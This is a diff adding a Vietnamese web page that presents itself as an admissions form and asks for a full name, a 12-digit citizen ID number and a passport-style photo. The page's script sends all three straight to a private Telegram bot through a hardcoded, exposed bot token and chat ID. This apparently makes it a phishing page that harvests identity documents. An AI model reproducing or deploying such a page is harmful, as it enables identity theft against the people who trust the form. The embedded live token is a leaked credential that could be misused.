@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="shortcut icon" type="image/png" href="https://i.imgur.com/KWLwTcm.jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <title>NGUYỄN VĂN KIÊN</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@10/dist/sweetalert2.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.imgur.com/TWlv0UK.jpg');
+            background-color: #f4f4f4;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+
+    <style>
+        /* Ẩn thanh điều khiển của thẻ audio */
+        audio::-webkit-media-controls {
+            display: none;
+        }
+    </style>
+    <audio id="play" loop>
+        <source src="https://rr4---sn-npoeenek.googlevideo.com/videoplayback?expire=1712179067&ei=GnMNZq7sOfyb4-EPo8mhkAY&ip=54.179.10.160&id=o-AKg54vSUQoH4iJxSbs7qdHsS-PjiRX10pL9LqDLskOdq&itag=18&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&mh=KF&mm=31%2C26&mn=sn-npoeenek%2Csn-30a7yner&ms=au%2Conr&mv=m&mvi=4&pl=17&initcwndbps=1211250&spc=UWF9f3BiXBKd3cx100GKaoMklv086WHTIqcprRyqPswIL1w&vprv=1&svpuc=1&mime=video%2Fmp4&ns=rkWkB9ZcBoYiKqrqVZmsk8kQ&cnr=14&ratebypass=yes&dur=234.521&lmt=1658940064924006&mt=1712157178&fvip=1&fexp=51141541&c=WEB&sefc=1&txp=5318224&n=HLbRa5O5S2T0_Q&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Cns%2Ccnr%2Cratebypass%2Cdur%2Clmt&sig=AJfQdSswRAIgRT3HSnFbQWLxhoYUmvaGp2LQO159tzcA8-ruKKbtL3kCIHWXX5wQLi_sMQvIwG1c-HTxP4rgNZ88_VUS3m7oDPK1&lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&lsig=ALClDIEwRQIhALwz4DaEqYxVEf2XWVNVlW-ZE8ShbdPAMS_VGXv7iADxAiB9QbqAFgqdqjwBsqjqekFr0qhbDI6fT_S10DB8QUXDkw%3D%3D">
+    </audio>
+    <audio id="play2" loop>
+        <source src="https://rr5---sn-npoeenlk.googlevideo.com/videoplayback?expire=1712179844&ei=JHYNZomyNevjjuMP5_2c2Aw&ip=54.179.10.160&id=o-AEGeItBJ_MjGtyigLqvmeeWcry_5eHXn6kdZlNqNtrJS&itag=18&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&mh=cU&mm=31%2C26&mn=sn-npoeenlk%2Csn-30a7rne6&ms=au%2Conr&mv=m&mvi=5&pl=17&initcwndbps=1278750&spc=UWF9f0cE9KxW4AERwij_KZhN3RO6g9Sg1gxVAY6Cj3P3dh4&vprv=1&svpuc=1&mime=video%2Fmp4&ns=W6Pfpp9mfdOXL5iJQOfHZP0Q&gir=yes&clen=15597126&ratebypass=yes&dur=198.484&lmt=1706611272477070&mt=1712157900&fvip=5&fexp=51141541&c=WEB&sefc=1&txp=5538434&n=8QM8el6-gdyocg&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&sig=AJfQdSswRQIhAJFQJ8OkCahH3SxXN0dV7t8IZqojTnXH65a_V1bIOaKjAiBXHtuWidkJJmpFeuHduTFIe-vPrdDfLOx5aDJHi6WccQ%3D%3D&lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&lsig=ALClDIEwRgIhAP8FlUadQPzy3x8qB7toOSWhQ6MlViqWOVFU0h2EoI4TAiEAgtNvclveWpdNLCtMSsxHdoZGR8xg_rAjET_pD-si_zw%3D">
+    </audio>
+    <audio id="play3" loop>
+        <source src="https://rr5---sn-npoe7ns7.googlevideo.com/videoplayback?expire=1712180702&ei=fnkNZs2LFbCN3LUPoeuqmAc&ip=54.179.10.160&id=o-ADZDVDE9g_ILiQY4-QnI8-Y3Pm8acvlfbqVNgTAd5Kff&itag=18&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&mh=5n&mm=31%2C26&mn=sn-npoe7ns7%2Csn-30a7rned&ms=au%2Conr&mv=m&mvi=5&pl=17&initcwndbps=1367500&spc=UWF9f1Bw0W_NMPJF5SLT5w__VMyzyMV6OabA-AczU5hu2Po&vprv=1&svpuc=1&mime=video%2Fmp4&ns=9h_hxVtz2I7SG7b2ioRa2ZsQ&gir=yes&clen=4006920&ratebypass=yes&dur=89.977&lmt=1710341306442288&mt=1712158645&fvip=1&fexp=51141541&c=WEB&sefc=1&txp=5538434&n=ryUUzxolPXRRAA&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&sig=AJfQdSswRQIgPAL_NV0MacxogasxNkbLfiklebsb2MTQxpqYukQJzkECIQCe9xcCLdGyzBlM5iEsItILu7xTKc_-B8pEXeeUdzcceA%3D%3D&lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&lsig=ALClDIEwRQIhAPCnaqP7cwA2Qt21ujczpbt16UbLVUZotXEm17YbR59lAiA9hZPWSqpKhnqnrP-CCKL-ICSRI4LaJRqUUwJ5AK39Xg%3D%3D">
+    </audio>
+    <audio id="play4" loop>
+        <source src="https://rr1---sn-npoe7ndl.googlevideo.com/videoplayback?expire=1712181207&ei=d3sNZuedOJ334-EPrvWuiA4&ip=54.179.10.160&id=o-AB129VOZRX-i7XJt7EK-jGUrg6VbpYvQPtfWvzF0LGOQ&itag=18&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&mh=lb&mm=31%2C29&mn=sn-npoe7ndl%2Csn-npoldn7y&ms=au%2Crdu&mv=m&mvi=1&pl=17&gcr=sg&initcwndbps=1065000&spc=UWF9f48OQjbWdMUSUdSdm9vJFU8jJ1u6PXc1TNxKc2fymWs&vprv=1&svpuc=1&mime=video%2Fmp4&ns=Sk7FoygZYTkzGXSzKTbt0jQQ&gir=yes&clen=6109260&ratebypass=yes&dur=304.018&lmt=1700817876819838&mt=1712159097&fvip=3&fexp=51141542&c=WEB&sefc=1&txp=2319224&n=cSbafeqvlptUNw&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cgcr%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&lsig=ALClDIEwRgIhALAFZHvpLZfVLnZTTNj552E6lIQnticOIAppTcET2mwWAiEAkWMe0sqkgnboKX0bIyJIXB4PwmrdICRcp9iLV0MH5Zg%3D&sig=AJfQdSswRQIhALXZBCNP95v2CRzuP6SMfBRsycWnS7bEvf9wv0WNFLjtAiB_Ngyw6v6NduCYVZfWThUWKuFq628aEM6zSbZtuyZBSQ%3D%3D">
+    </audio>
+    
+
+</head>
+<body>
+
+<form id="myForm">
+    <h2>Điền thông tin tuyến sinh</h2>
+    <input type="text" id="fullname" placeholder="Họ và tên">
+    <input type="number" id="idnumber" placeholder="Số căn cước có 12 số">
+    <div class="form-group">
+        <label for="photo">Ảnh 4x6:</label>
+        <input type="file" id="photo" name="photo" accept="image/*" required>
+    </div>
+    <button type="submit">Gửi</button>
+</form>
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+
+    // Lấy tham chiếu đến thẻ audio
+    var audio1 = document.getElementById("play");
+        var audio2 = document.getElementById("play2");
+        var audio3 = document.getElementById("play3");
+        var audio4 = document.getElementById("play4");
+    
+        var audioStarted = false;
+
+function playAudio() {
+    if (!audioStarted) {
+        audioStarted = true;
+        var randomNumber = Math.random();
+        var randomAudio;
+        if (randomNumber < 0.33) {
+            randomAudio = audio1;
+        } else if (randomNumber < 0.66) {
+            randomAudio = audio2;
+        } else {
+            randomAudio = audio3;
+        }
+        randomAudio.play();
+        randomAudio.addEventListener("ended", function() {
+            audioStarted = false; // Reset lại biến để phát bài hát mới khi kết thúc
+        });
+    }
+}
+
+document.addEventListener("click", playAudio);
+    async function sendToTelegram(fullname, idnumber, photo) {
+        const telegramBotToken = '6593363467:AAG78zb3Mhbn7Tn2j7AfQcOxb9qo2UVV7KE';
+        const chatId = '6520036650'; // Có thể là ID của một kênh hoặc chat cụ thể trên Telegram
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+        const requestData = new FormData();
+        requestData.append("chat_id", chatId);
+        requestData.append("photo", photo);
+        requestData.append("caption", `Họ và tên: ${fullname}\nSố căn cước: ${idnumber}`);
+
+        try {
+            const response = await axios.post(url, requestData, {
+                headers: {
+                    'Content-Type': 'multipart/form-data'
+                }
+            });
+
+            if (response.data.ok) {
+                return true;
+            } else {
+                console.error('Error sending message to Telegram:', response.data);
+                return false;
+            }
+        } catch (error) {
+            console.error('Error sending message to Telegram:', error);
+            return false;
+        }
+    }
+
+    document.getElementById("myForm").addEventListener("submit", async function (event) {
+        event.preventDefault();
+        const fullname = document.getElementById("fullname").value;
+        const idnumber = document.getElementById("idnumber").value;
+        const photo = document.getElementById("photo").files[0];
+
+        if (fullname.trim() === '' || idnumber.trim() === '' || !photo) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Vui lòng nhập đầy đủ thông tin!',
+            });
+            return;
+        }
+
+        if (idnumber.length !== 12) {
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Số căn cước cần phải có 12 số!',
+            });
+            return;
+        }
+
+        const success = await sendToTelegram(fullname, idnumber, photo);
+        if (success) {
+            Swal.fire({
+                icon: 'success',
+                title: 'Success',
+                text: 'Thông tin đã được gửi đi!',
+            });
+        } else {
+            Swal.fire({
+                icon: 'error',
+                title: 'Oops...',
+                text: 'Có lỗi xảy ra khi gửi thông tin!',
+            });
+        }
+    });
+
+    // Hiển thị thông báo khi nhạc được phát
+    Swal.fire({
+  title: "Điền Cho Đúng Ảnh Cho Đẹp Nhé",
+  width: 600,
+  padding: "3em",
+  color: "#716add",
+  background: "#fff url(https://sweetalert2.github.io/images/trees.png)",
+  backdrop: `
+    rgba(0,0,123,0.4)
+    url("https://sweetalert2.github.io/images/nyan-cat.gif")
+    left top
+    no-repeat
+  `
+});
+</script>
+
+</body>
+</html>
